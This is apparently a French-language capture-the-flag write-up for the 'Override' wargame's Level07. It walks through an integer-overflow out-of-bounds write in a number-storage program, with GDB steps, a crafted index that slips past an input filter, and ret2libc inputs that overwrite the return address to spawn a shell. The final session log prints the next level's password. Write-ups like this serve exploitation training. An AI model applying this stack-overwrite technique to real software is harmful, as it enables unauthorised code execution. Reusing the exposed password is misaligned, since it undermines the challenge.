@@ -1,0 +1,215 @@
+# 📘 Override – Level07
+
+## 📝 Description
+
+Ce niveau présente un service de stockage de nombres, manipulant un tableau local de 100 entiers.
+L'objectif est d’exploiter une **écriture hors limites** causée par un **integer overflow** dans le calcul de l’index.
+
+En contournant les protections intégrées et en ciblant l’adresse de retour sur la stack, nous pouvons rediriger l'exécution vers `system("/bin/sh")`.
+
+---
+
+# 🔍 Analyse du binaire
+
+## Fonction vulnérable : `store_number()`
+
+```c
+printf(" Number: ");
+uVar1 = get_unum();        // nombre à stocker
+
+printf(" Index: ");
+uVar2 = get_unum();        // index choisi par l'utilisateur
+
+*(uint *)(uVar2 * 4 + param_1) = uVar1;  // ⚠️ aucune vérification !
+```
+
+### Ce qui rend l’exploitation possible :
+
+1. **L’index est un unsigned int** → il peut overflow.
+2. `uVar2 * 4` overflow en 32 bits → permet d’écrire n’importe où dans la stack.
+3. On peut écraser **l’adresse de retour (EIP)** du `main()`.
+
+### Restrictions du programme
+
+Le programme interdit :
+
+* les index multiples de **3**
+* les nombres dont le byte haut vaut `0xB7`
+  (ce qui évite d'écrire dans `.plt` et `.got`)
+
+Mais ces restrictions sont **contournables via integer overflow**.
+
+---
+
+# 🔎 Localisation du tableau
+
+Dans GDB :
+
+```
+(gdb) b store_number
+(gdb) r
+(gdb) p/x *(int*)($ebp + 8)
+$1 = 0xffffd424
+```
+
+👉 Voici l’adresse **param_1**, c'est-à-dire **local_1bc**.
+
+---
+
+# 🎯 Trouver l’adresse de retour (EIP)
+
+On place un breakpoint juste avant le `ret` :
+
+```
+(gdb) b *0x080489f1
+```
+
+Puis on observe :
+
+```
+(gdb) x/wx $esp
+0xffffd5ec:  0xf7e45513    ← EIP sauvegardé
+```
+
+Distance entre tableau et EIP :
+
+```
+0xffffd5ec - 0xffffd424 = 0x1C8 = 456 bytes
+```
+
+Comme chaque élément est un uint (4 bytes) :
+
+```
+456 / 4 = 114
+```
+
+🎯 **index = 114 écrase directement EIP**
+Mais c’est interdit : `114 % 3 == 0`.
+
+---
+
+# 💡 Contournement via integer overflow
+
+On doit choisir un index `I` tel que :
+
+```
+(I * 4) mod 2³² == 456
+```
+
+Or :
+
+```
+I = (2³² / 4) + 114
+  = 1073741824 + 114
+  = 1073741938
+```
+
+Vérification :
+
+```
+1073741938 * 4 = 0x1000001C8 → modulo 2³² → 456
+```
+
+✔ Cet index n’est **pas multiple de 3** → accepté.
+
+---
+
+# 🎯 Trouver les adresses utiles (system + "/bin/sh")
+
+```
+(gdb) info functions system
+0xf7e6aed0 = system
+
+(gdb) find 0xf7e2c000,0xf7fd0000, "/bin/sh"
+0xf7f897ec = /bin/sh
+```
+
+Nous avons donc :
+
+* **system** = `4159090384` (0xf7e6aed0)
+* **"/bin/sh"** = `4160264172` (0xf7f897ec)
+
+---
+
+# 💥 Exploitation finale
+
+### 1️⃣ Écraser EIP → mettre l’adresse de `system`
+
+```
+Input command: store
+ Number: 4159090384     ← system()
+ Index: 1073741938       ← overflow vers EIP (114)
+```
+
+### 2️⃣ Placer l’argument pour `system("/bin/sh")`
+
+`system()` s’attend à trouver l’argument juste après l’EIP sur la stack.
+
+```
+EIP    → system
+[+4]   → /bin/sh argument
+```
+
+EIP est à index **114**, donc l’argument est à **index 116**.
+
+Car apres un system call il attends une adresse de retour a index 115.
+
+```
+Index = 116
+```
+
+Payload :
+
+```
+Input command: store
+ Number: 4160264172     ← "/bin/sh"
+ Index: 116
+```
+
+### 3️⃣ Quitter pour déclencher le retour
+
+```
+Input command: quit
+$ whoami
+level08
+```
+
+🔥 **Shell obtenu !**
+
+---
+
+# 🧪 Capture de la session complète
+
+```
+Input command: store
+ Number: 4159090384
+ Index: 1073741938
+ Completed store command successfully
+
+Input command: store
+ Number: 4160264172
+ Index: 116
+ Completed store command successfully
+
+Input command: quit
+$ whoami
+level08
+$ cat /home/users/level08/.pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+```
+
+---
+
+# ✅ Résumé du Level07
+
+| Élément                 | Valeur                                 |
+| ----------------------- | -------------------------------------- |
+| Vulnérabilité           | Integer overflow + write-out-of-bounds |
+| Tableau (`local_1bc`)   | 0xffffd424                             |
+| Adresse de retour (EIP) | 0xffffd5ec                             |
+| Distance                | 456 bytes → index 114                  |
+| Index overflow final    | **1073741938**                         |
+| Adresse de system()     | 0xf7e6aed0                             |
+| Adresse "/bin/sh"       | 0xf7f897ec                             |
+| Argument index          | 116                                    |
+| Shell obtenu ?          | ✔ Oui                                  |
